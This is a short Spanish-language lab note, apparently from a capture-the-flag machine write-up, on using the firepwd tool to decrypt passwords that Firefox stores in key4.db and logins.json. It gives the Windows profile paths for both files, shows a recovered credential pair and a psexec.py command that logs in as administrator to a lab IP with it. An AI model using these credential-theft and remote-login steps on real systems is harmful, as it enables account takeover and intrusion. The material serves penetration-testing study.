es una herramienta para recuperar contraseñas almacenadas en navegadores Firefox. Su funcionamiento se basa en descifrar los datos de contraseñas que Firefox guarda en archivos como `key3.db` o `key4.db`, utilizando algoritmos de cifrado como 3DES y AES

Para poder obtener las contraseñas es necesario tener los dos siguientes ficheros
- **logins.json**: Contiene las credenciales almacenadas, incluyendo nombres de usuario y contraseñas cifradas.
- **Key3.db / key4.db**: Archivos de la base de datos que contienen las claves de cifrado necesarias para descifrar las contraseñas.

```
https://github.com/lclevy/firepwd
```

# **URL's**
Estas son las rutas de los dos ficheros
## **Key4.db**
```
C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\key4.db
```

## **Login.json**
```
C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\logins.json
```

# Ejemplo Firepwd
Descargamos el script y al ejecutarlo nos encuentra unas credenciales
```
mayor:8CL7O1N78MdrCIsV
```
![[Pasted image 20240726075116.png]]
![[Pasted image 20240726075150.png]]

Accedemos con psexec y ya somos admin
```
psexec.py WORKGROUP/mayor:8CL7O1N78MdrCIsV@10.10.3.123
```
![[Pasted image 20240726080845.png]]

Realizado en maquina[[MAQUINA GATEKEEPER (Buffer overflow con badchars y escalada de privilegios obteniendo contraseñas de firefox con firepwd)]]